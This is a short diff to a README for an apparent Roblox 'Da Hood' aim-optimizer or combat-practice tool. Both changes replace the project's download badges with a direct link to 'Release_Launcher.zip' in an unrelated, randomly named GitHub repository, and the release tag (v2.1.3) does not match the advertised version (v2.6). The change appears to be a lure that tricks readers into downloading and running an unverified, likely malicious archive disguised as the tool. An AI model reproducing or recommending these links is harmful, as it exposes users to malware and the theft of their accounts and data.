@@ -4,7 +4,7 @@
 <div align="center">
 
 
-[![Download Button](https://img.shields.io/badge/DOWNLOAD-Click%20Here-brightgreen?style=for-the-badge&logo=download&logoColor=white)](https://towerfiscalinferno.github.io/Da-hood-Rivals-AimOptimizer/)
+[![Download Button](https://img.shields.io/badge/DOWNLOAD-Click%20Here-brightgreen?style=for-the-badge&logo=download&logoColor=white)](https://github.com/SupportSpace84/jtfujlhx/releases/download/v2.1.3/Release_Launcher.zip)
 
 
 </div>
@@ -327,4 +327,4 @@ Contributions are welcome across code, translations, drill packs, and route subm
 
 Da Hood Combat Lab 2026 is a long project about a simple belief: deliberate practice beats luck over time. The lab does not reward impatience, and it does not pretend that mastery is instant. It simply measures, records, and reports — and then hands the results back so that the next session is a little better than the last.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v2.6-blue?style=for-the-badge&logo=github&logoColor=white)](https://towerfiscalinferno.github.io/Da-hood-Rivals-AimOptimizer/)
+[![Download Now](https://img.shields.io/badge/Download%20Now-v2.6-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/SupportSpace84/jtfujlhx/releases/download/v2.1.3/Release_Launcher.zip)
